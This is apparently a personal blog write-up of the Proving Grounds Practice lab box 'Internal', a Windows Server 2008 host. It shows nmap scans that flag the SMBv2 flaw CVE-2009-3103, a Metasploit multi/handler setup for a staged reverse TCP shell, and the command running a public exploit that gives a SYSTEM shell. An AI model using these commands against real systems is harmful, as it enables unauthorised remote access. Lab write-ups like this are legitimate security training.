---
title: "PG Practice - Internal"
date: 2026-06-22
draft: false
tags: ["Proving Grounds Practice", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_internal/pg_internal_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Easy |
| Type | Windows |

**Port Scan**

```
└─$ nmap -sV -sC -p- 192.168.237.40    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 +0200
Nmap scan report for 192.168.237.40
Host is up (0.036s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-07-24T21:18:58
|_Not valid after:  2026-01-23T21:18:58
|_ssl-date: 2026-06-23T19:31:49+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-06-23T19:31:41+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-23T19:31:41
|_  start_date: 2025-07-25T21:18:51
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-23T12:31:41-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.74 seconds
```

## Proof

The target is a **Windows Server 2008** running **SMBv2** as we can see in the port scan results. If we further enumerate this very old technology stack by running **nmap SMB scripts** against it, we can see that the target is vulnerable to **CVE-2009-3103**:

```
└─$ nmap --script "smb*" 192.168.237.40 -p 139,445
.
.
.
---SNIP---
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
---SNIP---
```

I exploited this by using this [public exploit](https://github.com/Neved4/exploits/tree/main/CVE-2009-3103). Before running the exploit i started a listener in metasploit using the _multi/handler_ module and configured it as follows:

```
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST $TUN0_IP
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > run
```

I then ran the exploit in a separate terminal window:
```
└─$ python3 exploit.py 192.168.118.40 192.168.45.159 4444
```

> A non-staged payload like _windows/x64/shell_reverse_tcp_ didn't work so i had to use the staged payload _windows/shell/reverse_tcp_. (which is used by default in this exploit) To be able to receive a reverse shell with this payload I used the metasploit _multi/handler_ module. This is because a simple netcat listener is unable to process these payloads. 


![](/images/writeup_screens/pg_internal/pg_internal1.png)

With the _SYSTEM_ user i was able to read _C:\Users\Administrator\Desktop\proof.txt_.